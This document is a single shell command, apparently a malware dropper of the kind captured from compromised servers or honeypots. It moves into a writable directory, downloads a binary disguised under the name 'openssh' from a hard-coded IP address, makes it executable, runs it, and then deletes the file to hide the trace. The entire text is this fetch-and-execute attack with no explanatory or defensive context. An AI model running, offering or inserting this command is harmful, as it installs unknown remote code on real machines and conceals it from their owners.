cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.36.210.166/openssh; chmod +x openssh; ./openssh; rm -rf openssh
